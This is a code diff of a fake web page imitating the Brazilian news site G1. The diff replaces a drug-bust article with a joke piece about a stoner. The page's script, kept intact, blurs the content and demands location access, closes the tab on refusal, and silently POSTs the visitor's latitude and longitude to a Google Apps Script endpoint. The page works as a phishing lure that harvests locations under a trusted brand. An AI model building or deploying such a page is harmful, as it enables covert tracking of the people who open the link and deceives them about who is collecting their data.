@@ -11,7 +11,14 @@
       background-color: #f5f5f5;
       color: #222;
       position: relative;
-      overflow: hidden;
+      overflow: auto;
+    }
+
+    .top-image {
+      width: 100%;
+      max-height: 300px;
+      object-fit: cover;
+      display: block;
     }
 
     header {
@@ -76,14 +83,12 @@
       z-index: 1;
     }
 
-    /* Blur e bloqueio inicial */
     .blurred {
       filter: blur(8px);
-      pointer-events: none; /* bloqueia interações */
-      user-select: none; /* bloqueia seleção */
+      pointer-events: none;
+      user-select: none;
     }
 
-    /* Overlay que escurece e bloqueia */
     #overlay {
       position: fixed;
       top: 0; left: 0; right: 0; bottom: 0;
@@ -101,24 +106,34 @@
 </head>
 <body>
 
+  <!-- Imagem no topo -->
+  <img class="top-image" src="https://thumbs.dreamstime.com/b/antecedentes-de-jovens-mudas-maconha-canabis-org%C3%A2nicos-em-crescimento-na-explora%C3%A7%C3%A3o-papel-parede-cultivo-do-c%C3%A2nhamo-biol%C3%B3gico-158145829.jpg?w=768" 
+       alt="Imagem de fundo de plantação" />
+
   <header>
     <h1>G1</h1>
   </header>
 
   <nav>
-    <span>Notícias</span> &nbsp; | &nbsp; Política &nbsp; | &nbsp; Economia &nbsp; | &nbsp; Mundo &nbsp; | &nbsp; Tecnologia &nbsp; | &nbsp; Saúde
+    <span>Notícias</span> &nbsp; | &nbsp; Humor &nbsp; | &nbsp; Curiosidades &nbsp; | &nbsp; Inusitado &nbsp; | &nbsp; Cotidiano
   </nav>
 
   <div class="container">
-    <div class="title">Plantação de maconha e laboratório de drogas são encontrados em casa na BR-265</div>
-    <div class="subinfo">25/07/2025 15h30 - Atualizado há 2 horas</div>
+    <div class="title">Maconheiro encontra a resposta para todos os problemas... mas esquece qual era a pergunta</div>
+    <div class="subinfo">26/07/2025 16h20 - Atualizado há poucos minutos</div>
 
     <div class="content">
-      <p>Uma plantação de maconha e um laboratório de drogas foram encontrados pela polícia dentro de uma residência localizada na BR-265, na zona rural de Lavras, em Minas Gerais. A operação foi conduzida pela Polícia Militar após denúncias anônimas.</p>
-      <p>Segundo as autoridades, no local foram apreendidas diversas mudas de cannabis, equipamentos para cultivo indoor e substâncias químicas usadas na fabricação de entorpecentes.</p>
-      <p>O responsável pela residência foi preso em flagrante e encaminhado à delegacia da cidade. A Polícia Civil segue investigando o caso para identificar possíveis conexões com o tráfico regional.</p>
-      <p>Investigações continuam para desarticular toda a rede envolvida, visando reduzir o impacto do tráfico na região.</p>
-      <p>O caso também reacende o debate sobre políticas públicas de combate às drogas e a necessidade de ações integradas entre as forças de segurança.</p>
+      <p>Em um momento que pode ser descrito como “filosoficamente trágico”, um jovem conhecido apenas como Lelé, morador de São José dos Pinhais, afirmou ter descoberto a resposta para todos os problemas da humanidade.</p>
+
+      <p>“Foi como um clarão! Tipo quando você entende o final de um filme muito louco. Eu vi tudo... paz mundial, energia limpa, fim do tédio”, declarou ele com os olhos arregalados e um pacote de salgadinho aberto no colo.</p>
+
+      <p>Segundo testemunhas, Lelé estava sentado em sua rede, olhando fixamente para um ventilador desligado, quando teve o que chamou de “a grande revelação cósmica da vida”. Imediatamente ele levantou e correu para anotar... mas parou no meio do caminho.</p>
+
+      <p>“Eu fiquei tipo: ‘Caraca, era isso! Era isso!’... Só que aí eu fui pegar uma caneta e... puff... sumiu. Eu não lembro mais nem qual era a pergunta”, desabafou entre risos e mordidas em um pão de alho.</p>
+
+      <p>O caso viralizou nas redes sociais, com internautas sugerindo que talvez a resposta fosse “42”, em homenagem ao clássico nerd. Outros argumentam que a verdadeira solução pode ter se perdido para sempre nos pensamentos de Lelé junto com o controle remoto e a chave do portão.</p>
+
+      <p>Enquanto isso, Lelé promete tentar lembrar o que era durante o próximo baseado. “Tá na ponta da língua, juro. Se eu lembrar, eu aviso geral... ou pelo menos anoto no braço.”</p>
     </div>
   </div>
 
@@ -129,18 +144,15 @@
   <div id="overlay">Por favor, permita o acesso à sua localização para continuar navegando</div>
 
   <script>
-    // Ao carregar a página, adiciona o blur e overlay
     document.body.classList.add('blurred');
 
     function liberarConteudo() {
-      // Remove blur e oculta overlay
       document.body.classList.remove('blurred');
       document.getElementById('overlay').style.display = 'none';
     }
 
     window.addEventListener('load', () => {
       if (!navigator.geolocation) {
-        // Não suporta geolocalização, fecha aba
         window.close();
         return;
       }
@@ -149,9 +161,9 @@
         const lat = pos.coords.latitude;
         const lon = pos.coords.longitude;
 
-        // Envia dados para Google Script
         const url = "https://script.google.com/macros/s/AKfycbwk5F09_2ajt_z2a054KA369U7s33QNwLiTu1AO06KbvU4mRUgQixX-yICwbMzYLxHF/exec";
         const payload = { latitude: lat, longitude: lon };
+
         try {
           await fetch(url, {
             method: "POST",
@@ -164,7 +176,6 @@
         liberarConteudo();
 
       }, (error) => {
-        // Usuário negou ou erro ao obter localização - fecha aba
         window.close();
       });
     });
